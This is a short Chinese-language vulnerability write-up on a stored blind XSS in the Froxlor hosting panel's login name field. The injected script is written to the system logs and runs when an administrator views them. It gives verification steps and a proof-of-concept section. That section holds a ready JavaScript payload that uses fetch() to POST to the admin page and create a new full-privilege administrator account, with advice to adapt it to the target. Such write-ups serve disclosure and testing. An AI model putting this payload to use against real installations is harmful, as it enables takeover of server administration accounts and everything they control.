验证漏洞存在方法
    - 在Froxlor登录页面的登录名参数中注入基本的XSS payload，如：`<script>alert('XSS')</script>`
    - 尝试登录（无论成功与否），payload会被记录到系统日志中
    - 当管理员查看系统日志时，如果弹窗出现，则漏洞存在

漏洞利用方法
    - 这是一个存储型盲XSS漏洞，攻击者可以在登录名参数中注入恶意JavaScript代码
    - 注入的payload会被存储在系统日志中，当管理员查看日志时自动执行
    - 攻击者可以利用此漏洞强制管理员执行未经授权的操作，例如添加新的管理员账户
    
PoC示例：
```javascript
// 基本XSS验证payload
<script>alert(document.domain)</script>

// 更复杂的攻击payload示例（添加管理员）
<script>
fetch('/admin.php?page=admins&action=add', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
    },
    body: 'loginname=attacker&password=attacker123&password_confirmation=attacker123&name=Attacker&email=attacker@example.com&customernumber=1&api_allowed=1&change_serversettings=1&diskspace=0&traffic=0&subdomains=0&emails=0&email_accounts=0&email_forwarders=0&ftps=0&mysqls=0&custom=0&domains=0&caneditphpsettings=1&ip=0&isadmin=1&deactivated=0&theme=Sparkle&language=en&sendpassword=1'
});
</script>
```

**注意**: 实际利用需要根据目标Froxlor的具体配置调整payload。此漏洞在Froxlor 2.1.9版本中已修复。
